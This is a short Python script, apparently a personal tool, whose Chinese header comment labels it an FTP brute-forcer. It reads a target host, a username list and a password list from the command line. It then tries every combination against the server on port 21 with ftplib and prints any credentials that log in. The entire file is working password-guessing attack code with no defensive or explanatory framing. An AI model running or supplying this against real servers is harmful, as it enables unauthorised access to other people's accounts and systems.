'''
Description: 
Autor: mukeers
Date: 2021-06-09 19:05:04
LastEditors: mukeers
LastEditTime: 2021-06-17 09:17:06
'''
# ftp爆破
import ftplib
import sys

ftpserver = sys.argv[1]
userdic = sys.argv[2]
passworddic = sys.argv[3]

if len(sys.argv) != 4:
    print("ftpserver userdic passworddic")
    sys.exit(1)

def ftpcrack(ftpserver,hostname,passwordfile):
    pf = open(passwordfile,'r')
    print(passworddic,ftpserver,userdic,passwordfile,'pf')
    for line in pf.readlines():
        username = hostname
        # password = line
        password = line.strip('\n')
        print(username,password,'line pf')
        try:
            ftp = ftplib.FTP(ftpserver)
            ftp.connect(ftpserver,21,timeout=10)
            ftp.login(username,password)
            print(username,ftpserver,passworddic,'login')
            print('\n[+] ' + str(hostname) + 'FTP Login Succeede: '+ username + "/" + password)
            ftp.quit()
            return(username,password)
        except:
            pass

def main():
    namefile = open(userdic,'r')
    for line in namefile.readlines():
        hostname = line.strip('\n')
        # print(hostname,'hostname')
        ftpcrack(ftpserver,hostname,passworddic)

if __name__ == '__main__':
    main()
